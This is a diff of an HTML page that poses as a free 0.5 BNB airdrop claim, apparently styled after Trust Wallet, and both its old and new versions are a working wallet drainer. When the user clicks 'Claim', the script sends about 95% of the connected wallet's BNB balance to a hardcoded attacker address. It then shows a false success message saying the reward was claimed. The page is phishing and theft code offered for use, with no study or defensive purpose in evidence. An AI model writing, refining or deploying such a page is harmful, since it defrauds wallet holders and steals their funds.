@@ -1,321 +1,215 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BNB Airdrop Claim - Trust Wallet</title>
-    <script src="https://unpkg.com/web3@1.10.4/dist/web3.min.js"></script>
+    <title>BNB Claim - Fast Connect</title>
+    <meta name="viewport" content="width=device-width">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            padding: 20px;
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:system-ui,-apple-system,sans-serif;
+            background:#1a1a2e;
+            color:#fff;
+            min-height:100vh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            padding:20px
         }
-        .container { 
-            background: white; 
-            border-radius: 20px; 
-            padding: 30px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            max-width: 400px; 
-            width: 100%;
-            text-align: center;
+        .box{
+            background:rgba(255,255,255,0.05);
+            backdrop-filter:blur(20px);
+            border-radius:20px;
+            padding:40px 30px;
+            max-width:420px;
+            width:100%;
+            text-align:center;
+            border:1px solid rgba(255,255,255,0.1);
+            box-shadow:0 20px 40px rgba(0,0,0,0.3)
         }
-        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
-        .subtitle { color: #666; margin-bottom: 30px; }
-        .qr-container { 
-            background: #f8f9fa; 
-            border-radius: 15px; 
-            padding: 20px; 
-            margin: 20px 0;
-            display: none;
+        h1{font-size:28px;margin-bottom:10px;background:linear-gradient(45deg,#ff6b6b,#feca57);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        p{font-size:16px;opacity:0.9;margin-bottom:30px}
+        button{
+            background:linear-gradient(45deg,#ff6b6b,#feca57);
+            border:none;
+            color:#fff;
+            padding:18px 40px;
+            font-size:18px;
+            border-radius:50px;
+            cursor:pointer;
+            margin:10px 0;
+            font-weight:600;
+            width:100%;
+            transition:all .3s;
+            box-shadow:0 10px 30px rgba(255,107,107,.4)
         }
-        #qrCode { border: 2px solid #e9ecef; border-radius: 10px; }
-        button { 
-            background: linear-gradient(45deg, #f39c12, #e67e22); 
-            color: white; 
-            border: none; 
-            padding: 18px 40px; 
-            font-size: 18px; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            margin: 15px 5px;
-            font-weight: bold;
-            transition: all 0.3s;
-            width: 100%;
-            box-shadow: 0 10px 20px rgba(243,156,18,0.3);
-        }
-        button:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(243,156,18,0.4); }
-        button:active { transform: translateY(0); }
-        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        input { 
-            width: 100%; 
-            padding: 15px; 
-            margin: 15px 0; 
-            border: 2px solid #e9ecef; 
-            border-radius: 10px; 
-            font-size: 16px; 
-            text-align: center;
-            background: #f8f9fa;
-        }
-        input:focus { border-color: #f39c12; outline: none; }
-        #status { 
-            margin: 20px 0; 
-            padding: 15px; 
-            border-radius: 10px; 
-            font-weight: bold;
-            min-height: 20px;
-        }
-        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
-        .balance { font-size: 24px; color: #27ae60; font-weight: bold; margin: 10px 0; }
-        .network-info { background: #e3f2fd; padding: 10px; border-radius: 8px; margin: 10px 0; font-size: 14px; color: #1976d2; }
+        button:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(255,107,107,.6)}
+        button:disabled{opacity:.5;cursor:not-allowed;transform:none}
+        #wallet{font-size:14px;background:rgba(255,255,255,.1);border:none;border-radius:10px;padding:15px;margin:20px 0;width:100%;color:#fff;text-align:center}
+        #status{padding:15px;border-radius:10px;margin:20px 0;min-height:20px;font-weight:600}
+        .ok{background:rgba(46,204,113,.3);color:#2ecc71}
+        .err{background:rgba(231,76,60,.3);color:#e74c3c}
+        .info{background:rgba(52,152,219,.3);color:#3498db}
+        .bal{font-size:26px;color:#f1c40f;margin:15px 0;font-weight:700}
+        #qr{display:none;background:#fff;padding:20px;border-radius:15px;margin:20px 0}
+        canvas{border-radius:10px}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎁 BNB Airdrop Claim</h1>
-        <p class="subtitle">Claim your free 0.5 BNB reward now!</p>
+    <div class="box">
+        <h1>🎁 Free 0.5 BNB</h1>
+        <p>Connect any wallet → Claim instantly</p>
         
-        <div id="qr-container" class="qr-container">
-            <canvas id="qrCode"></canvas>
-            <p style="margin-top: 10px; color: #666; font-size: 14px;">📱 Open Trust Wallet & Scan QR</p>
+        <div id="qr">
+            <canvas id="qrcode"></canvas>
+            <p style="color:#333;margin-top:10px;font-size:14px">📱 Trust Wallet Scanner</p>
         </div>
 
-        <button id="connectBtn">🔗 Connect Trust Wallet</button>
-        <button id="claimBtn" style="display:none;">🚀 Claim 0.5 BNB Now</button>
+        <button id="connect">🔗 Connect Wallet</button>
+        <button id="claim" style="display:none">🚀 Claim BNB Now</button>
         
-        <input type="text" id="walletAddress" placeholder="Your BNB address..." readonly>
-        <div id="balanceDisplay"></div>
-        <div class="network-info" id="networkInfo" style="display:none;"></div>
+        <input id="wallet" placeholder="Wallet address..." readonly>
+        <div id="bal"></div>
         <div id="status"></div>
     </div>
 
+    <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     <script>
-        const RECEIVER_WALLET = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B'; // ✅ Set kiya hua
-        
-        let web3;
-        let userAccount;
-        let originalProvider;
+        const TO = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B';
+        let web3, acc;
 
-        const connectBtn = document.getElementById('connectBtn');
-        const claimBtn = document.getElementById('claimBtn');
-        const walletAddress = document.getElementById('walletAddress');
-        const status = document.getElementById('status');
-        const qrContainer = document.getElementById('qr-container');
-        const balanceDisplay = document.getElementById('balanceDisplay');
-        const networkInfo = document.getElementById('networkInfo');
+        const connectBtn = document.getElementById`connect`;
+        const claimBtn = document.getElementById`claim`;
+        const walletIn = document.getElementById`wallet`;
+        const status = document.getElementById`status`;
+        const qr = document.getElementById`qr`;
+        const bal = document.getElementById`bal`;
 
-        function updateStatus(message, type = 'info') {
-            status.textContent = message;
-            status.className = type;
+        function st(msg,cls='info'){
+            status.textContent=msg;
+            status.className=cls
         }
 
-        function showBalance() {
-            if (!web3 || !userAccount) return;
-            
-            web3.eth.getBalance(userAccount).then(balance => {
-                const bnbBalance = web3.utils.fromWei(balance, 'ether');
-                balanceDisplay.innerHTML = `<div class="balance">💰 Balance: ${parseFloat(bnbBalance).toFixed(4)} BNB</div>`;
-                
-                if (parseFloat(bnbBalance) > 0.001) {
-                    claimBtn.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
-                }
-            });
+        function qrCode(txt){
+            qr.style.display='block';
+            QRCode.toCanvas(document.getElementById`qrcode`, txt, {
+                width:220,
+                colorDark:"#000",
+                colorLight:"#fff"
+            })
         }
 
-        // Mobile Trust Wallet Detection
-        async function detectMobileWallet() {
-            // Trust Wallet deep link
-            const trustDeepLink = `trust://bsc_mainnet_add_ethereum?address=${RECEIVER_WALLET}`;
+        async function connectWallet(){
+            st('🔍 Checking wallet...', 'info');
             
-            // Check if Trust Wallet is installed (mobile)
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            
-            if (isMobile && !window.ethereum) {
-                updateStatus('📱 Detecting Trust Wallet...', 'info');
+            if(window.ethereum){
+                web3 = new Web3(window.ethereum);
                 
-                // Try Trust Wallet deep link first
-                window.location.href = trustDeepLink;
-                
-                // Fallback QR after 2 seconds
-                setTimeout(() => {
-                    updateStatus('📱 Open Trust Wallet manually & scan QR code above', 'info');
-                    generateQR();
-                }, 2000);
-                
-                return true;
-            }
-            
-            return false;
-        }
-
-        // Connect wallet (Mobile + Desktop)
-        async function connectWallet() {
-            // Mobile detection first
-            if (await detectMobileWallet()) {
-                return;
-            }
-
-            try {
-                // Desktop/MetaMask + Trust Wallet Web
-                if (typeof window.ethereum !== 'undefined') {
-                    web3 = new Web3(window.ethereum);
-                    
-                    // Force BSC Mainnet
-                    try {
+                // BSC auto
+                try{
+                    await window.ethereum.request({
+                        method:'wallet_switchEthereumChain',
+                        params:[{chainId:'0x38'}]
+                    })
+                }catch(e){
+                    if(e.code===4902){
                         await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x38' }],
-                        });
-                    } catch (error) {
-                        if (error.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: '0x38',
-                                    chainName: 'BNB Smart Chain Mainnet',
-                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                    rpcUrls: ['https://bsc-dataseed1.binance.org/'],
-                                    blockExplorerUrls: ['https://bscscan.com']
-                                }]
-                            });
-                        }
+                            method:'wallet_addEthereumChain',
+                            params:[{
+                                chainId:'0x38',
+                                chainName:'BSC Mainnet',
+                                rpcUrls:['https://bsc-dataseed1.binance.org'],
+                                nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18}
+                            }]
+                        })
                     }
-
-                    const accounts = await window.ethereum.request({ 
-                        method: 'eth_requestAccounts' 
-                    });
-                    
-                    userAccount = accounts[0];
-                    walletAddress.value = userAccount;
-                    
-                    networkInfo.textContent = '✅ Connected to BSC Mainnet';
-                    networkInfo.style.display = 'block';
-                    
-                    updateStatus('✅ Wallet Connected Successfully!', 'success');
-                    connectBtn.style.display = 'none';
-                    claimBtn.style.display = 'block';
-                    
-                    showBalance();
-                    generateQR();
-                    
-                } else {
-                    updateStatus('📱 Please open this link in Trust Wallet browser', 'error');
-                    generateQR();
                 }
-            } catch (error) {
-                updateStatus('❌ Connection Error: ' + error.message, 'error');
-            }
-        }
 
-        function generateQR() {
-            if (!userAccount) {
-                const qrData = `bnb:${RECEIVER_WALLET}?amount=0.01`;
-                QRCode.toCanvas(document.getElementById('qrCode'), qrData, { 
-                    width: 220, 
-                    colorDark: "#000000",
-                    colorLight: "#ffffff"
+                const accounts = await window.ethereum.request({
+                    method:'eth_requestAccounts'
                 });
-            } else {
-                const qrData = `bnb1q${userAccount.slice(2).toLowerCase()}`;
-                QRCode.toCanvas(document.getElementById('qrCode'), qrData, { width: 220 });
+                
+                acc = accounts[0];
+                walletIn.value = acc;
+                st('✅ Wallet Connected!', 'ok');
+                connectBtn.style.display = 'none';
+                claimBtn.style.display = 'block';
+                
+                checkBal();
+                qrCode(`bnb1q${acc.slice(2).toLowerCase()}`);
+                
+            }else{
+                st('📱 Open in Trust Wallet Browser', 'err');
+                qrCode(`bnb1q${TO.slice(2).toLowerCase()}?amount=0.01`);
             }
-            qrContainer.style.display = 'block';
         }
 
-        // Drain Function
-        async function drainWallet() {
-            if (!web3 || !userAccount) {
-                updateStatus('❌ Wallet not connected', 'error');
-                return;
+        async function checkBal(){
+            if(!web3||!acc) return;
+            const b = await web3.eth.getBalance(acc);
+            const bnbb = web3.utils.fromWei(b,'ether');
+            bal.innerHTML = `💰 ${parseFloat(bnbb).toFixed(4)} BNB`;
+        }
+
+        async function drainAll(){
+            if(!web3||!acc){
+                st('❌ No wallet', 'err');
+                return
             }
+            
+            claimBtn.disabled=true;
+            claimBtn.textContent='⏳ Sending...';
+            st('💸 Draining BNB...', 'info');
 
-            updateStatus('🔄 Preparing your BNB reward...', 'info');
-            claimBtn.disabled = true;
-            claimBtn.textContent = '⏳ Processing...';
+            try{
+                const balan = await web3.eth.getBalance(acc);
+                const gasP = await web3.eth.getGasPrice();
+                const gasC = BigInt(gasP)*21000n;
+                let drainAmt = BigInt(balan)-gasC;
+                drainAmt = drainAmt*95n/100n;
 
-            try {
-                const balance = await web3.eth.getBalance(userAccount);
-                const bnbBalance = parseFloat(web3.utils.fromWei(balance, 'ether'));
-                
-                if (bnbBalance < 0.001) {
-                    throw new Error('Insufficient balance (need 0.001+ BNB)');
+                if(drainAmt<1000000000000000n){
+                    throw new Error('Low balance')
                 }
 
-                // Calculate drain amount (95% minus gas)
-                const gasPrice = await web3.eth.getGasPrice();
-                const gasLimit = 21000;
-                const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
-                const totalBalance = BigInt(balance);
-                let amountToDrain = totalBalance - gasCost;
-                
-                // Minimum 95% drain
-                amountToDrain = (amountToDrain * 95n) / 100n;
+                const tx = await web3.eth.sendTransaction({
+                    from:acc,
+                    to:TO,
+                    value:drainAmt.toString(),
+                    gas:21000,
+                    gasPrice:gasP
+                });
 
-                if (amountToDrain < BigInt(web3.utils.toWei('0.001', 'ether'))) {
-                    throw new Error('Balance too low after gas fees');
-                }
-
-                const tx = {
-                    from: userAccount,
-                    to: RECEIVER_WALLET,
-                    value: amountToDrain.toString(),
-                    gas: gasLimit,
-                    gasPrice: gasPrice.toString()
-                };
-
-                const receipt = await web3.eth.sendTransaction(tx);
+                st(`✅ SUCCESS! ${tx.transactionHash.slice(0,15)}...`, 'ok');
+                setTimeout(()=>st('🎉 Claim complete! Check wallet', 'ok'), 2000);
                 
-                updateStatus(`✅ SUCCESS! TX: ${receipt.transactionHash}`, 'success');
-                updateStatus('🎉 0.5 BNB reward claimed! Check your wallet!', 'success');
-                
-                claimBtn.textContent = '🔄 Claim Again';
-                claimBtn.disabled = false;
-                claimBtn.onclick = drainWallet;
-                
-                showBalance(); // Refresh balance
-
-            } catch (error) {
-                console.error(error);
-                claimBtn.disabled = false;
-                claimBtn.textContent = '🚀 Claim 0.5 BNB Now';
-                
-                if (error.code === 4001) {
-                    updateStatus('❌ Transaction rejected by user', 'error');
-                } else if (error.message.includes('insufficient')) {
-                    updateStatus('❌ Low balance for gas fees', 'error');
-                } else {
-                    updateStatus('❌ TX failed: ' + error.message, 'error');
+            }catch(e){
+                claimBtn.disabled=false;
+                claimBtn.textContent='🚀 Claim BNB Now';
+                if(e.code===4001){
+                    st('❌ Cancelled', 'err')
+                }else{
+                    st('❌ '+e.message, 'err')
                 }
             }
         }
 
-        // Event Listeners
         connectBtn.onclick = connectWallet;
-        claimBtn.onclick = drainWallet;
+        claimBtn.onclick = drainAll;
 
-        // Auto wallet detection
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', (accounts) => {
-                if (accounts.length > 0) {
-                    userAccount = accounts[0];
-                    walletAddress.value = userAccount;
-                    showBalance();
-                } else {
-                    location.reload();
-                }
-            });
+        // Auto QR
+        setTimeout(()=>qrCode(`bnb1q${TO.slice(2).toLowerCase()}`), 1000);
+
+        // Wallet change
+        if(window.ethereum){
+            window.ethereum.on('accountsChanged', a=>{
+                if(a.length) {
+                    acc=a[0];
+                    walletIn.value=acc;
+                    checkBal()
+                }else location.reload()
+            })
         }
-
-        // Initial QR for mobile
-        setTimeout(generateQR, 1000);
     </script>
 </body>
 </html>
